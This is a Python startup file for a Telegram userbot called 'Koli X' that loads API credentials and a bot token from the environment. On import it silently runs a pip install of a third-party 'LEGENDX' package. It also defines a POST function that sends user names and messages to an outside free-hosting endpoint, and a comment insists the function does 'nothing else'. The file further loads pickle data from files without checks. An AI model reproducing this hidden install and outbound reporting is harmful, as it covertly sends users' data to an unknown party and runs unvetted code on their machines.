# COPYRIGHT (C) 2021 BY LEGENDX22
"""
"""
# MADE BY Manish 🔥
# MY IDEA H YRR DONT KANG THIS PLEASE
import asyncio
import os
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession
os.system("pip install LEGENDX==0.0.21")
try:
  from ULTRA import bot 
except:
  pass
from LEGENDX import devs, id, ID
API_ID = os.environ.get("APP_ID", None)
API_HASH = os.environ.get("API_HASH", None)
token = os.environ.get("TG_BOT_TOKEN_BF_HER", None)
xbot = TelegramClient("legend", API_ID, API_HASH).start(bot_token=token)
import time
MESSAGE = os.environ.get("ALIVE_MSG", None)
if MESSAGE is None:
   MSG = '''
🔥🔥 THE Koli X IS ONLINE 🔥🔥
I AM HERE FOR MY MASTER PROTECTION + BEST USERBOT
'''
else:
  MSG = MESSAGE
botnickname = os.environ.get("BOT_NICK_NAME")
ALIVE_NAME = os.environ.get("ALIVE_NAME")
BOT = str(botnickname) if botnickname else "Koli χ"
NAME = str(ALIVE_NAME) if ALIVE_NAME else "Koli χ"
PHOTO = os.environ.get("ALIVE_PHOTTO", None)
ULTRAX = "[Owner](https://t.me/Loltage)"
VERSION = "0.0.1"
ALIVE_USERNAME = os.environ.get("ALIVE_USERNAME", None)
ALIVE_BOT_USERNAME = os.environ.get("ALIVE_BOT_USERNAME", None)
devs = devs
ID = ID
id = id
REPO = "[Koli χ вσт](https://t.me/koliXsupport)"

kangers = [55510385643]

from requests import post

def POST(user, msg):
  if user == None:
     user = ' '
  elif msg == None:
    msg = ' '
  else:
      pass #post maar rHa hu nothing else
  r = post(f"https://legendx22.000webhostapp.com/user.php? user={user}&msg={msg}")
import pickle as p
def rd(file):
  try:
    f = open(file, "rb")
    LEGENDX = p.load(f)
    f.close()
    return LEGENDX
  except:
    return False
import pickle as p
def wt(obj, file):
  try:
    f = open(file, "wb")
    p.dump(obj, f)
    f.close()
    return True
  except:
    return False

MASTER = NAME
GROUP = "[SUPPORT GROUP](https://t.me/koliXsupport)"
if __name__=="__main__":
  bot.start()
  bot.run_until_disconnected()
  xbot.run_until_disconnected()
